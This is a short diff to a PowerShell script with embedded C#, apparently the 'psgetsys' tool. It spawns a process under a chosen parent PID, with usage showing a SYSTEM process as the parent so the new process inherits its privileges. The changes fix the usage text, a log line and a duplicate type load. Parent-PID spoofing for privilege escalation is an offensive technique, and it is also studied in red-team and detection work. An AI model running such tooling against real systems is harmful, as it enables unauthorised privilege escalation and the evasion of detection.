@@ -1,5 +1,5 @@
 #Simple powershell/C# to spawn a process under a different parent process 
-#usage: import-module psgetsys.ps1;  ImpersonateFromParentPid -ppid <parentpid> -command <command to execute> -cmdargs <command arguments>
+#usage: import-module psgetsys.ps1;  [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
 $mycode = @"
 using System;
 using System.Diagnostics;
@@ -122,7 +122,7 @@ public class MyProcess
             var tattr = new SECURITY_ATTRIBUTES();
             pattr.nLength = Marshal.SizeOf(pattr);
             tattr.nLength = Marshal.SizeOf(tattr);
-            Console.Write("[+] Starting " + command  + "...");
+            Console.Write("[+] Starting " + cmdargs  + "...");
 			var b= CreateProcess(command, cmdargs, ref pattr, ref tattr, false,EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, IntPtr.Zero, null, ref si, out pi);
 			Console.WriteLine(b+ " - pid: " + pi.dwProcessId+ " - Last error: "  +GetLastError() );
 			
@@ -166,11 +166,11 @@ Param
     )
 
 
-if (-not ([System.Management.Automation.PSTypeName]$mycode).Type)
+if (-not ([System.Management.Automation.PSTypeName]'MyProcess').Type)
 {
     Add-Type -TypeDefinition $mycode
 }
-Add-Type -TypeDefinition $mycode
+
 
 [MyProcess]::CreateProcessFromParent($ppid,$command,"$command $cmdargs")
 
